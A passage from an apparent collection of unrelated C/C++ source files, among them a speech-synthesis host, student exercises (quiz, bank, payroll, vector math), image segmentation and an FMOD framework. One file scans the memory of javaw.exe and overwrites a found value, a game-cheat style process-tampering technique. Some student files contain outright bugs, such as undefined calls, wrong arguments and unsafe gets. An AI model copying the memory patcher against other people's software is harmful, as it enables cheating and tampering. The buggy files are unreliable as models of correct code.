str_jtalk_dict_dir.c_str();\n\n    VoicevoxResultCode result = voicevox_initialize(options);\n\n    if (result != VoicevoxResultCode::VOICEVOX_RESULT_OK) {\n        const char* utf8Str = voicevox_error_result_to_message(result);\n        juce::Logger::outputDebugString(juce::CharPointer_UTF8(utf8Str));\n    }\n\n    isInitialized = true;\n}\n\nVoicevoxCoreHost::~VoicevoxCoreHost()\n{\n    jassert(sharedVoicevoxCoreLibrary->isHandled());\n\n    if (isInitialized.load())\n    {\n        voicevox_finalize();\n    }\n\n    isInitialized = false;\n}\n\n//==============================================================================\njuce::String VoicevoxCoreHost::getVersion() const\n{\n    jassert(sharedVoicevoxCoreLibrary->isHandled());\n\n    return juce::String(juce::CharPointer_UTF8(voicevox_get_version()));\n}\n\n//==============================================================================\njuce::var VoicevoxCoreHost::getSupportedDevicesJson() const\n{\n    jassert(sharedVoicevoxCoreLibrary->isHandled());\n\n    juce::var result_json;\n\n    const auto devices_json = voicevox_get_supported_devices_json();\n    juce::JSON::parse(juce::CharPointer_UTF8(devices_json), result_json);\n\n    return result_json;\n}\n\nbool VoicevoxCoreHost::isGPUMode() const\n{\n    jassert(sharedVoicevoxCoreLibrary->isHandled());\n\n    return voicevox_is_gpu_mode();\n}\n\n//==============================================================================\njuce::var VoicevoxCoreHost::getMetasJson() const\n{\n    jassert(sharedVoicevoxCoreLibrary->isHandled());\n\n    juce::var result_json;\n\n    const auto metas_json = voicevox_get_metas_json();\n    juce::JSON::parse(juce::CharPointer_UTF8(metas_json), result_json);\n\n    return result_json;\n}\n\njuce::Result VoicevoxCoreHost::loadModel(juce::uint32 speaker_id)\n{\n    jassert(sharedVoicevoxCoreLibrary->isHandled());\n\n    try {\n        VoicevoxResultCode result = voicevox_load_model(speaker_id);\n        \n        if (result != VoicevoxResultCode::VOICEVOX_RESULT_OK) {\n            const char* utf8Str = voicevox_error_result_to_message(result);\n            juce::Logger::outputDebugString(juce::CharPointer_UTF8(utf8Str));\n            return juce::Result::fail(juce::CharPointer_UTF8(utf8Str));\n        }\n    }\n    catch (std::exception e) {\n        return juce::Result::fail(e.what());\n    }\n\n    return juce::Result::ok();\n}\n\nbool VoicevoxCoreHost::isModelLoaded(juce::uint32 speaker_id) const\n{\n    jassert(sharedVoicevoxCoreLibrary->isHandled());\n\n    return voicevox_is_model_loaded((uint32_t)speaker_id);\n}\n\n//==============================================================================\ndouble VoicevoxCoreHost:",
    "#include<iostream>\nusing namespace std;\nint merge(int arr[], int start, int mid, int end){\n    int i = start, j = mid + 1, k = 0;\n    int temp[end - start + 1];\n    int count = 0;\n    while(i <= mid && j <= end){\n        if(arr[i] > arr[j]){\n            count += mid - i + 1;\n            temp[k++] = arr[j++];\n        }else{\n            temp[k++] = arr[i++];\n        }\n    }\n    while(i <= mid){\n        temp[k++] = arr[i++];\n    }\n    while(j <= end){\n        temp[k++] = arr[j++];\n    }\n    for(int i = start, k = 0; i <= end; i++, k++){\n        arr[i] = temp[k];\n    }\n    return count;\n}\nint largestPair(int arr[], int start, int end){\n    if(start >= end){\n        return 0;\n    }\n    int mid = (start + end) / 2;\n    int count = 0;\n    count += count_inversion(arr, start, mid);\n    count += count_inversion(arr, mid + 1, end);\n    count += merge(arr, start, mid, end);\n    return count;\n}\nint main()\n{\n    int input;\n    cin>>input;\n    int array[input];\n    for(int i=0;i<input;i++)\n    {\n        cin>>array[i];\n    }\n    int index1=0,index2=0;\n    largestPair(array,0,input-1,index1,index2);\n    return 0;\n}",
    "#include <iostream>\n\nnamespace ArrayPair\n{\n\nstd::pair<int ,int> * create_array(unsigned int size)\n{\n    std::pair<int ,int> * x = new std::pair<int , int >[size];\n\nreturn x;\n}\n\nvoid delete_array (std::pair<int,int> * arr)\n{\n    delete[] arr;\n}\n\nvoid Set_Pair (std::pair<int,int> * arr , unsigned int index,std::pair<int,int> val )\n{\n\narr[index].first=val.first;\narr[index].second=val.second;\n\n}\nvoid get_Pair (std::pair<int,int> * arr , unsigned int index,std::pair<int,int> *val )\n{\n\nval->first=arr[index].first;\nval->second=arr[index].second;\n\n}\n\nvoid Print_Array(std::pair<int,int> * arr , unsigned int size)\n{\n    for (int i =0 ; i < size ; i ++)\n    {\n        std::cout<<\"index : \"<<i<<\" First : \"<<arr[i].first<<\" Second\"<<arr[i].second<<std::endl;\n    }\n}\n\n\n}\n\nint main()\n{\n\n std::pair<int ,int> temp {1,2};   \nstd::pair<int ,int> * array_of_pairs;    \narray_of_pairs=ArrayPair::create_array(5);\nArrayPair::Set_Pair(array_of_pairs,0,temp);\nArrayPair::Print_Array(array_of_pairs,1);\nArrayPair::get_Pair(array_of_pairs,0,&temp);\n\nstd::cout<<temp.first<<\"  \"<<temp.second<<std::endl;\n\nArrayPair::delete_array(array_of_pairs);\n\n\n\nreturn 0;\n}",
    "#include <iostream>\n#include <vector>\n#include <Windows.h>\n#include <TlHelp32.h>\n\n#define INFO(x) std::cout << \"[INFO] \" << x << '\\n'\n#define ERROR(x) std::cerr << \"[ERROR] \" << x << '\\n'\n\nstd::vector<MEMORY_BASIC_INFORMATION> GetReadableWritableMemoryPages(const HANDLE handle) {\n    std::vector<MEMORY_BASIC_INFORMATION> storage;\n    MEMORY_BASIC_INFORMATION memInfo;\n    LPVOID memoryAddress = nullptr;\n\n    while (VirtualQueryEx(handle, memoryAddress, &memInfo, sizeof(memInfo)) == sizeof(memInfo))\n    {\n        if (memInfo.Protect & (PAGE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))\n        {\n            storage.push_back(memInfo);\n        }\n\n        memoryAddress = (LPVOID)((ULONG_PTR) memInfo.BaseAddress + memInfo.RegionSize);\n    }\n\n    return storage;\n}\n\nLPVOID ScanMemory(const HANDLE handle, const int& valueToFind) {\n    for (const auto& page : GetReadableWritableMemoryPages(handle)) {\n        for (auto address = (DWORD_PTR) page.BaseAddress;\n             address < (DWORD_PTR) page.BaseAddress + page.RegionSize;\n             address += sizeof(int))\n        {\n            int valueRead = 0;\n            SIZE_T bytesRead;\n            auto success = ReadProcessMemory(handle, (LPCVOID)address, &valueRead, sizeof(valueRead), &bytesRead);\n\n            if (success && bytesRead == sizeof(valueRead))\n            {\n                if (valueRead == valueToFind)\n                {\n                    INFO(\"Found value \" << valueToFind << \" at address \" << (void*)address);\n                    return (LPVOID)address;\n                }\n            }\n        }\n    }\n\n    ERROR(\"Value \" << valueToFind << \" not found in any readable/writable memory pages.\");\n    return nullptr;\n}\n\nvoid VerifyAndModifyValue(const HANDLE handle, LPVOID address, int newValue)\n{\n    int valueRead = 0;\n    SIZE_T bytesRead;\n\n    if (ReadProcessMemory(handle, address, &valueRead, sizeof(valueRead), &bytesRead))\n    {\n        INFO(\"Value before modification: \" << valueRead << \" at address \" << address);\n\n        DWORD oldProtect;\n\n        if (VirtualProtectEx(handle, address, sizeof(newValue), PAGE_EXECUTE_READWRITE, &oldProtect))\n        {\n            if (WriteProcessMemory(handle, address, &newValue, sizeof(newValue), &bytesRead))\n            {\n                INFO(\"Successfully wrote new value \" << newValue << \" to address \" << address);\n            }\n            else\n            {\n                ERROR(\"Failed to write new value to address \" << address << \" error: \" << GetLastError());\n            }\n\n            VirtualProtectEx(handle, address, sizeof(newValue), oldProtect, &oldProtect);\n        } else {\n            ERROR(\"Failed to change memory protection at address \" << address << \" error: \" << GetLastError());\n        }\n\n        if (ReadProcessMemory(handle, address, &valueRead, sizeof(valueRead), &bytesRead))\n        {\n            INFO(\"Value after modification: \" << valueRead << \" at address \" << address);\n        }\n        else\n        {\n            ERROR(\"Failed to read memory at address \" << address << \" error: \" << GetLastError());\n        }\n    }\n    else\n    {\n        ERROR(\"Failed to read memory at address \" << address << \" error: \" << GetLastError());\n    }\n}\n\nDWORD GetProcessId(const std::string& processName)\n{\n    PROCESSENTRY32 entry;\n    entry.dwSize = sizeof(PROCESSENTRY32);\n\n    auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);\n\n    if (Process32First(snapshot, &entry) == TRUE)\n    {\n        while (Process32Next(snapshot, &entry) == TRUE) \n        {\n            if (std::string(entry.szExeFile) == processName) \n            {\n                CloseHandle(snapshot);\n                return entry.th32ProcessID;\n            }\n        }\n    }\n\n    CloseHandle(snapshot);\n    return 0;\n}\n\nint main()\n{\n    DWORD processId = GetProcessId(\"javaw.exe\");\n\n    auto handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, processId);\n\n    if (handle == nullptr)\n    {\n        ERROR(\"Failed to get the handle to the process\");\n        return 1;\n    }\n\n    INFO(\"Successfully got the handle to the process 0x\" << handle);\n\n\n    LPVOID foundAddress = ScanMemory(handle, 121212);\n\n    if (foundAddress != nullptr)\n    {\n        int newValue = 69;\n        VerifyAndModifyValue(handle, foundAddress, newValue);\n    }\n\n    CloseHandle(handle);\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <cmath>\n\n// Definicion de la estructura Dot\nstruct Dot {\n    float x, y, z;\n\n    Dot(float x, float y, float z) : x(x), y(y), z(z) {}\n\n    // Constructor para 2D\n    Dot(float x, float y) : x(x), y(y), z(0) {}\n\n    // Constructor por defecto\n    Dot() : x(0), y(0), z(0) {}\n};\n\n// Calcular la distancia entre dos puntos en 2D o 3D\nfloat calcularDistancia(const Dot& a, const Dot& b) {\n    return std::sqrt(std::pow(b.x - a.x, 2) + std::pow(b.y - a.y, 2) + std::pow(b.z - a.z, 2));\n}\n\n// Calcular el vector resultante de la suma de dos vectores en 2D o 3D\nDot sumaVectores(const Dot& a, const Dot& b) {\n    return Dot(a.x + b.x, a.y + b.y, a.z + b.z);\n}\n\n// Calcular el vector resultante de un arreglo de N vectores en 2D o 3D\nDot sumaN_vectores(const Dot arr[], int n) {\n    float x = 0, y = 0, z = 0;\n    for (int i = 0; i < n; ++i) {\n        x += arr[i].x;\n        y += arr[i].y;\n        z += arr[i].z;\n    }\n    return Dot(x, y, z);\n}\n\n// Calcular el producto escalar de dos vectores en 2D o 3D\nfloat productoEscalar(const Dot& a, const Dot& b) {\n    return (a.x * b.x) + (a.y * b.y) + (a.z * b.z);\n}\n\n// Calcular el producto cruz de dos vectores en 3D\nDot productoCruz(const Dot& a, const Dot& b) {\n    return Dot(a.y * b.z - a.z * b.y, a.z * b.x - a.x * b.z, a.x * b.y - a.y * b.x);\n}\n\n// Imprimir el vector en el formato especificado\nvoid imprimirVector(const Dot& v) {\n    std::cout << \"u = \" << v.x << \"i + \" << v.y << \"j + \" << v.z << \"k\\n\";\n    if (v.z == 0 && v.y == 0)\n        std::cout << \"Plano X\\n\";\n    else if (v.z == 0 && v.x == 0)\n        std::cout << \"Plano Y\\n\";\n    else if (v.x == 0 && v.y == 0)\n        std::cout << \"Plano Z\\n\";\n    else if (v.z == 0)\n        std::cout << \"Plano XY\\n\";\n    else if (v.y == 0)\n        std::cout << \"Plano XZ\\n\";\n    else if (v.x == 0)\n        std::cout << \"Plano YZ\\n\";\n    else\n        std::cout << \"Espacio XYZ\\n\";\n}\n\n// Resolver un sistema de fuerzas (simplificado)\nDot resolverSistemaFuerzas(const Dot fuerzas[], int n) {\n    return sumaN_vectores(fuerzas, n);\n}\n\n// Funcion para leer un vector desde la entrada del usuario\nDot leerVector(bool en3D) {\n    float x, y, z = 0;\n    if (en3D) {\n        std::cout << \"Ingrese las coordenadas del vector (x y z): \";\n        std::cin >> x >> y >> z;\n    } else {\n        std::cout << \"Ingrese las coordenadas del vector (x y): \";\n        std::cin >> x >> y;\n    }\n    return Dot(x, y, z);\n}\n\n// Funcion principal para demostrar la funcionalidad\nint main() {\n    bool en3D;\n    char dimension;\n    std::cout << \"Trabajara con vectores en 2D o 3D? (Ingrese 2 o 3): \";\n    std::cin >> dimension;\n    en3D = (dimension == '3');\n\n    Dot p1 = leerVector(en3D);\n    Dot p2 = leerVector(en3D);\n\n    std::cout << \"Distancia entre p1 y p2: \" << calcularDistancia(p1, p2) << std::endl;\n\n    Dot suma = sumaVectores(p1, p2);\n    std::cout << \"Suma de p1 y p2: \";\n    imprimirVector(suma);\n\n    int n;\n    std::cout << \"Ingrese el numero de vectores: \";\n    std::cin >> n;\n    Dot* arr = new Dot[n];\n    for (int i = 0; i < n; ++i) {\n        std::cout << \"Ingrese el vector \" << i + 1 << \":\\n\";\n        arr[i] = leerVector(en3D);\n    }\n\n    Dot resultado = sumaN_vectores(arr, n);\n    std::cout << \"Suma de N vectores: \";\n    imprimirVector(resultado);\n\n    std::cout << \"Producto escalar de p1 y p2: \" << productoEscalar(p1, p2) << std::endl;\n\n    if (en3D) {\n        Dot cruz = productoCruz(p1, p2);\n        std::cout << \"Producto cruz de p1 y p2: \";\n        imprimirVector(cruz);\n    }\n\n    Dot sistemaFuerzas = resolverSistemaFuerzas(arr, n);\n    std::cout << \"Resultado del sistema de fuerzas: \";\n    imprimirVector(sistemaFuerzas);\n\n    delete[] arr;\n\n    return 0;\n}\n",
    "// Project 'Online Exam...'\r\n\r\n#include<stdio.h>\r\n#include<string.h>\r\n#include<stdlib.h>\r\n\r\nvoid add();\r\nint class10th();\r\nint class11th();\r\nint class12th();\r\nint oneday();\r\nint heading();\r\nint details();\r\nstruct student {\r\n\tchar stuname[30], gender[10],sclass[10],DOB[12];\r\n\tint rno;\r\n}stu;\r\n\r\nint main()\r\n{\r\n\tchar a;              // a = for enter and exit program   b=category of exam\r\n\tint score,b;\r\n\theading();\r\n\tprintf(\"\\n\\nEnter 1 to countinue the session || Press 0 to exit session : \");\r\n\tfflush(stdin);\r\n\tscanf(\"%c\",&a);\r\n\tdetails();\r\n\tif (a=='1')                             // entery block main logic implement ..\r\n\t{\r\n\t\tprintf(\"Welcome to Exam...\\n\");\r\n\t    printf(\"\\n\");\r\n\t    printf(\" Select Your Exam Category : \\n\");\r\n\t    printf(\"(1) 10th Class \\t \\t (2) 11th Class\\n\");\r\n\t    printf(\"(3) 12th Class \\t \\t (4) One Day Exam\\n\");\r\n\t    printf(\"\\nEnter Your Exam Category (Press the 1,2,3,4) : \");\r\n\t    fflush(stdin);\r\n\t    scanf(\"%d\",&b);\r\n\t    system(\"cls\");\r\n\t    //b=strupr(b);\r\n\t    printf(\"\\n\");\r\n\t    switch (b)\r\n\t    {\r\n\t    \tcase 1 :{\r\n\t    \t\tadd();\r\n\t\t\t\tscore=class10th();\r\n\t\t\t\tdetails();\r\n\t\t\t\tprintf(\"\\n\\n\\n\\t<<-------------------------------------------->>\\n\");\r\n\t\t\t\tprintf(\"      || Roll No : %d                               ||\\n\",stu.rno);\r\n\t\t\t\tprintf(\"      || Name : %s                              ||\\n\",stu.stuname);\r\n\t\t\t\tprintf(\"      || Gender : %s                            ||\\n\",stu.gender);\r\n\t\t\t\tprintf(\"      || DOB (dd-mm-yyyy) : %s                ||\\n\",stu.DOB);\r\n\t\t\t\tprintf(\"      || You are gain mask %d/25                    ||\\n\",score);\r\n\t\t\t\tprintf(\"\\n\\t<<-------------------------------------------->>\");\r\n\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\tcase 2 : {\r\n\t\t\t\tadd();\r\n\t\t\t\tscore=class11th();\r\n\t\t\t\tprintf(\"Roll No : %d\\n\",stu.rno);\r\n\t\t\t\tprintf(\"Name : %s\\n\",stu.stuname);\r\n\t\t\t//\tprintf(\"Class : %s\\n\",b);\r\n\t\t\t\tprintf(\"Gender : %s\\n\",stu.gender);\r\n\t\t\t\tprintf(\"DOB (dd-mm-yyyy) : %s\\n\",stu.DOB);\r\n\t\t\t\tprintf(\"You are gain mask %d/25\\n\",score);\r\n\t\t\t\tprintf(\"Class : %s\\n\",b);\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\r\n\t\t\tcase 3 :{\r\n\t\t\t\tadd();\r\n\t\t\t\tscore=class12th();\r\n\t\t\t\tprintf(\"Roll No : %d\\n\",stu.rno);\r\n\t\t\t\tprintf(\"Name : %s\\n\",stu.stuname);\r\n\t\t\t//\tprintf(\"Class : %s\\n\",b);\r\n\t\t\t\tprintf(\"Gender : %s\\n\",stu.gender);\r\n\t\t\t\tprintf(\"DOB (dd-mm-yyyy) : %s\\n\",stu.DOB);\r\n\t\t\t\tprintf(\"You are gain mask %d/25\\n\",score);\r\n\t\t\t\tprintf(\"Class : %s\\n\",b);\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\r\n\t\t\tcase 4 :{\r\n\t\t\t\tadd();\r\n\t\t\t\tscore=oneday();\r\n\t\t\t\tprintf(\"Roll No : %d\\n\",stu.rno);\r\n\t\t\t\tprintf(\"Name : %s\\n\",stu.stuname);\r\n\t\t\t//\tprintf(\"Class : %s\\n\",b);\r\n\t\t\t\tprintf(\"Gender : %s\\n\",stu.gender);\r\n\t\t\t\tprintf(\"DOB (dd-mm-yyyy) : %s\\n\",stu.DOB);\r\n\t\t\t\tprintf(\"You are gain mask %d/25\\n\",score);\r\n\t\t\t\tprintf(\"Class : %s\\n\",b);\r\n\t\t\t\tbreak;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\tdefault : {\r\n\t\t\t\tprintf(\"In-valid Exam Category\");\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\r\n       }\r\n\r\n   }\r\n\r\n    else\r\n\t{\r\n       \tprintf(\"Exit \");\r\n\t}\r\n\r\n}\r\n\r\n\r\nvoid add()\r\n{\r\n\theading();\r\n\tprintf(\"\\n\\n\\n\\t\\t\\t\\t\\t*-------------------------------------------------*\");\r\n\tprintf(\"\\n\\n\\t\\t\\t\\t\\t\\t\\tEnter the student name : \");\r\n\tfflush(stdin);\r\n\tgets(stu.stuname);\r\n\tprintf(\"\\n\\t\\t\\t\\t\\t\\t\\tEnter your roll no : \");\r\n\tscanf(\"%d\",&stu.rno);\r\n\tprintf(\"\\n\\t\\t\\t\\t\\t\\t\\tGender : \");\r\n\tscanf(\"%s\",&stu.gender);\r\n\tprintf(\"\\n\\t\\t\\t\\t\\t\\t\\tEnter your DOB(dd-mm-yyyy): \");\r\n\tscanf(\"%s\",&stu.DOB);\r\n\tsystem(\"cls\");\r\n\r\n\tprintf(\"\\n\");\r\n}\r\n\r\nint class10th()\r\n{\r\n\tchar ques[200],ans[25];\r\n\tint ques_no=25;\r\n\tint x,count=0;\r\n\tfor (x=0;x<ques_no;x++)\r\n\t{\r\n\t\tswitch (x) {\r\n\t\t\tcase 0 :{\r\n\t\t\t\tprintf(\"Q1.What does Parashurama consider as his own who breaks Lord Shiva's bow?\\n\");\r\n\t\t\t\tprintf(\"(a) enemy\\t \\t (B) Brother\\n\");\r\n\t\t\t\tprintf(\"(C) Friend \\t \\t (D) Neighbour\\n \");\r\n\t\t\t\tfflush(stdin);\r\n\t\t\t\tprintf(\"Answer is :\");\r\n\t\t\t\tscanf(\"%c\",&ans[x]);\r\n\t\t\t\tif (ans[x]=='A' || ans[x]=='a' ){\r\n\t\t\t\t\tprintf(\"Correct\\n\");\r\n\t\t\t\t\tcount++;\r\n\t\t\t\t\tprintf(\"\\n\");\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"In-correct\\n\");\r\n\t\t\t\t\tprintf(\"\\n\");\r\n\t\t\t\t}\r\n\t\t\t\tsystem(\"cls\");\r\n\t\t\t\tbreak;\r\n\t}\r\n\r\n\t\t\tcase 1 :{\r\n\t\t\t\tprintf(\"Q2.Where do warriors display their bravery?\\n\");\r\n\t\t\t\tprintf(\"(A) At Home \\t \\t (B) In War\\n\");\r\n\t\t\t\tprintf(\"(C) In Word \\t \\t (D) None of these\\n \");\r\n\t\t\t\tfflush(stdin);\r\n\t\t\t\tprintf(\"Answer is :\");\r\n\t\t\t\tscanf(\"%c\",&ans[x]);\r\n\t\t\t\tif (ans[x]=='B' || ans[x]=='b' )\r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"Correct\\n\");\r\n\t\t\t\t\tcount++;\r\n\t\t\t\t\tprintf(\"\\n\");\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"In-correct\\n\");\r\n\t\t\t\t\tprintf(\"\\n\");\r\n\t\t\t\t}\r\n\t\t\t\tsystem(\"cls\");\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\r\n\t\t\tcase 2 : {\r\n\t\t\t\tprintf(\"Q3.Parashuram is the bitter enemy of which clan?\\n\");\r\n\t\tprintf(\"(A) Brahmin \\t \\t (B) Vaishya Lie\\n\");\r\n\t\tprintf(\"(C) Kshatriya \\t \\t (D) None on these\\n\");\r\n\t\tfflush(stdin);\r\n\t\tprintf(\"Answer is :\");\r\n\t\tscanf(\"%c\",&ans[x]);\r\n\t\tif (ans[x]=='C' || ans[x]=='c' )\r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"Correct\\n\");\r\n\t\t\t\t\tcount++;\r\n\t\t\t\t\tprintf(\"\\n\");\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"In-Correct\\n\");\r\n\t\t\t\t\tprintf(\"\\n\");\r\n\t\t\t\t}\r\n\t\t\t\t\tsystem(\"cls\");\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\tcase 3 : {\r\n\t\t\t\tprintf(\"Q4.What does Parshuram consider Shiva?\\n\");\r",
    "#include \"Bank.hpp\"\n#include <iostream>\n#include <fstream>\n\nusing namespace std;\n\nBank::Bank(): name(\"<Unknown>\"),log_path(\"Unknown.log\")\n{\n    cout << \"Constructor 1 \"<< name << endl;\n}\n\n\nBank::Bank(string name):name(name),log_path(name+\".log\")\n{\n    cout << \"Constructor 2 \"<< name << endl;\n}\n\nBank::Bank(string name, string log_path):name(name),log_path(log_path)\n{\n    cout << \"Constructor 3 \"<< name << endl;\n}\n\nBank::~Bank()\n{\n    cout << \"Destructor \"<< name << endl;\n    for(auto a:accounts)\n    {\n        cout << \"\\t\" << a.name  << \" $\" << a.money << endl;\n    }\n    \n    ofstream file(log_path, ios::out);\n    file << \"Bank \"<< name << endl;\n    for(auto a:accounts)\n    {\n        file << \"\\t\" << a.name  << \" $\" << a.money << endl;\n    }\n    file.close();\n    \n}\n\n\nvoid Bank::Create(string name)\n{\n    for(auto acc:accounts)\n    {\n        if(name == acc.name){\n            cout << \"[Failed] Account exists.\" << endl;\n            return;\n        }\n    }\n    BankAccount b;\n    b.money = 0;\n    b.name = name;\n    accounts.push_back(b);\n}\nvoid Bank::Create(string name,double money)\n{\n    for(auto acc:accounts)\n    {\n        if(name == acc.name){\n            cout << \"(\"<< name <<\") [Failed] Account exists.\" << endl;\n            return;\n        }\n    }\n    BankAccount b;\n    b.money = money;\n    b.name = name;\n    accounts.push_back(b);\n}\n\nvoid Bank::Save(string name,double money)\n{\n    for(int i =0;i<accounts.size();i++)\n    {\n        if(accounts[i].name == name){\n            accounts[i].money += money;\n            return;\n        }\n    }\n    cout << \"(\"<< name <<\") [Failed] Account does not exist.\" << endl;\n\n}\nvoid Bank::Withdraw(string name,double money)\n{\n    for(int i =0;i<accounts.size();i++)\n    {\n        if(accounts[i].name == name){\n            if(accounts[i].money >= money)\n            {\n                accounts[i].money -= money;\n            }\n            else\n            {\n                cout << \"[Failed] (\"<< name <<\") Money is not enough.\" << endl;\n            }\n            return;\n        }\n    }\n    cout << \"[Failed] (\"<< name <<\") Account does not exist.\" << endl;\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\nstruct Pegawai {\r\n    string nama;\r\n    int jamKerja;\r\n    int honorLembur;\r\n    int totalHonor;\r\n};\r\n\r\nint main() {\r\n    int banyakData;\r\n    cout << \"Masukkan banyak data pegawai: \";\r\n    cin >> banyakData;\r\n\r\n    vector<Pegawai> daftarPegawai(banyakData);\r\n\r\n    for (int i = 0; i < banyakData; ++i) {\r\n        cout << \"\\nData Pegawai ke-\" << i + 1 << \":\" << endl;\r\n        cout << \"Nama Pegawai: \";\r\n        cin.ignore();\r\n        getline(cin, daftarPegawai[i].nama);\r\n        cout << \"Jam Kerja: \";\r\n        cin >> daftarPegawai[i].jamKerja;\r\n\r\n        // Menghitung honor lembur\r\n        if (daftarPegawai[i].jamKerja > 8) {\r\n            daftarPegawai[i].honorLembur = (daftarPegawai[i].jamKerja - 8) * 5000;\r\n        } else {\r\n            daftarPegawai[i].honorLembur = 0;\r\n        }\r\n\r\n        // Menghitung total honor\r\n        daftarPegawai[i].totalHonor = 8 * 5000 + daftarPegawai[i].honorLembur;\r\n    }\r\n\r\n    // Menampilkan tabel\r\n    cout << \"| No | Nama Pegawai | Jam Kerja | Honor Lembur | Total Honor |\\n\";\r\n    cout << \"|----|--------------|-----------|--------------|-------------|\\n\";\r\n    for (int i = 0; i < banyakData; ++i) {\r\n        cout << \"| \" << i + 1 << \"  | \" << daftarPegawai[i].nama << \" \";\r\n        cout << \" | \" << daftarPegawai[i].jamKerja << \"        | \" << daftarPegawai[i].honorLembur << \"        | \";\r\n        cout << daftarPegawai[i].totalHonor << \"        |\\n\";\r\n    }\r\n\r\n    return 0;\r\n}",
    "#include \"meter_seg.h\"\r\n#include <stdio.h>\r\n#include <iostream>\r\n\r\n#define seg_param \"C:/CPlusPlus/MeterSeg/weights/unet_416.param\"\r\n#define seg_bin \"C:/CPlusPlus/MeterSeg/weights/unet_416.bin\"\r\n\r\nMeterSegmentation* meterSeg = new MeterSegmentation(seg_param, seg_bin);\r\n\r\nvoid processSegmentation(const cv::Mat& input_image)\r\n{\r\n    if (input_image.empty()) {\r\n        printf(\"cv::imread read image failed\\n\");\r\n        return;\r\n    }\r\n\r\n    cv::Mat seg_result = meterSeg->Process(input_image);\r\n\r\n    cv::imshow(\"seg_result\", seg_result);\r\n    cv::waitKey(0);\r\n}\r\n\r\nvoid runSegmentation(const std::string& file_path) {\r\n   \r\n    cv::Mat input_image = cv::imread(file_path);\r\n    if (input_image.empty()) {\r\n        std::cerr << \"Failed to load image: \" << file_path << std::endl;\r\n        exit;\r\n    }\r\n    processSegmentation(input_image);\r\n\r\n    printf(\"segmentation end\\n\");\r\n}\r\n\r\nint main(int argc, char** argv)\r\n{\r\n    std::string file_path = \"C:/CPlusPlus/MeterSeg/images/seg_result_40.jpg\";\r\n    runSegmentation(file_path);\r\n\r\n    printf(\"meter end\\n\");\r\n    return 0;\r\n}",
    "/*==============================================================================\nFMOD Example Framework\nCopyright (c), Firelight Technologies Pty, Ltd 2012-2024.\n==============================================================================*/\n#define WIN32_LEAN_AND_MEAN\n\n#include \"common.h\"\n#include <stdio.h>\n#include <conio.h>\n#include <Windows.h>\n#include <Objbase.h>\n#include <vector>\n\nstatic HWND gWindow = nullptr;\nstatic int gScreenWidth = 0;\nstatic int gScreenHeight = 0;\nstatic unsigned int gPressedButtons = 0;\nstatic unsigned int gDownButtons = 0;\nstatic unsigned int gLastDownButtons = 0;\nstatic char gWriteBuffer[(NUM_COLUMNS+1) * NUM_ROWS] = {0};\nstatic char gDisplayBuffer[(NUM_COLUMNS+1) * NUM_ROWS] = {0};\nstatic unsigned int gYPos = 0;\nstatic bool gQuit = false;\nstatic std::vector<char *> gPathList;\n\nbool Common_Private_Test;\nint Common_Private_Argc;\nchar** Common_Private_Argv;\nvoid (*Common_Private_Update)(unsigned int*);\nvoid (*Common_Private_Print)(const char*);\nvoid (*Common_Private_Close)();\n\nvoid Common_Init(void** /*extraDriverData*/)\n{\n    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n}\n\nvoid Common_Close()\n{\n    CoUninitialize();\n\n    for (std::vector<char *>::iterator item = gPathList.begin(); item != gPathList.end(); ++item)\n    {\n        free(*item);\n    }\n    if (Common_Private_Close)\n    {\n        Common_Private_Close();\n    }\n}\n\nstatic unsigned int translateButton(unsigned int button)\n{\n    switch (button)\n    {\n        case '1':       return (1 << BTN_ACTION1);\n        case '2':       return (1 << BTN_ACTION2);\n        case '3':       return (1 << BTN_ACTION3);\n        case '4':       return (1 << BTN_ACTION4);\n        case VK_LEFT:   return (1 << BTN_LEFT);\n        case VK_RIGHT:  return (1 << BTN_RIGHT);\n        case VK_UP:     return (1 << BTN_UP);\n        case VK_DOWN:   return (1 << BTN_DOWN);\n        case VK_SPACE:  return (1 << BTN_MORE);\n        case VK_ESCAPE: return (1 << BTN_QUIT);\n        default:        return 0;\n    }\n}\n\nvoid Common_Update()\n{\n    MSG msg = { };\n    while (PeekMessage(&msg, nullptr, 0, 0, PM_REMOVE))\n    {\n        TranslateMessage(&msg);\n        DispatchMessage(&msg);\n    }\n\n    gPressedButtons = (gLastDownButtons ^ gDownButtons) & gDownButtons;\n    gPressedButtons |= (gQuit ? (1 << BTN_QUIT) : 0);\n    gLastDownButtons = gDownButtons;\n\n    memcpy(gDisplayBuffer, gWriteBuffer, sizeof(gWriteBuffer));\n    InvalidateRect(gWindow, nullptr, FALSE);\n\n    gYPos = 0;\n    memset(gWriteBuffer, ' ', sizeof(gWriteBuffer));\n    for (int i = 0; i < NUM_ROWS; i++)\n    {\n        gWriteBuffer[(i * (NUM_COLUMNS + 1)) + NUM_COLUMNS] = '\\n';\n    }\n\n    if (Common_Private_Update)\n    {\n        Common_Private_Update(&gPressedButtons);\n    }\n}\n\nvoid Common_Exit(int returnCode)\n{\n    exit(returnCode);\n}\n\nvoid Common_DrawText(const char *text)\n{\n    if (gYPos < NUM_ROWS)\n    {\n        char tempBuffer[NUM_COLUMNS + 1];\n        Common_Format(tempBuffer, sizeof(tempBuffer), \"%s\", text);\n        memcpy(&gWriteBuffer[gYPos * (NUM_COLUMNS + 1)], tempBuffer, strlen(tempBuffer));\n        